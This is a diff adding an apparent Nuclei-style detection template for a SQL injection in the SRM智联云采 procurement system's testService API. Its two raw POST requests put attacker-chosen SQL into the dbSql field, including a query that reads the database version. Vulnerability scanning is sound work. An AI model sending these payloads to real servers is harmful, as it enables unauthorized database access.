@@ -1,0 +1,57 @@
+id: poc-yaml-srm-testservice-sqli
+info:
+  name: SRM智联云采系统 testService SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /adpweb/a/ica/api/testService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "dbId": "1001",
+          "dbSql": "#set ($lang = $lang) SELECT * FROM",
+          "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+          "serviceCode": "q",
+          "serviceName": "q",
+          "serviceParams": "{\"lang\":\"zh_CN\"}"
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "服务器内部异常，请联系管理员"
+          - "sqlcode"
+          - "invalid table name"
+
+  - raw:
+      - |
+        POST /adpweb/a/ica/api/testService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "dbId": "1001",
+          "dbSql": "#set ($lang = $lang) SELECT * FROM v$version",
+          "responeTemplate": "{\"std_data\": {\"execution\": {\"sqlcode\": \"$execution.sqlcode\", \"description\": \"$execution.description\"}}}",
+          "serviceCode": "q",
+          "serviceName": "q",
+          "serviceParams": "{\"lang\":\"zh_CN\"}"
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "执行成功"
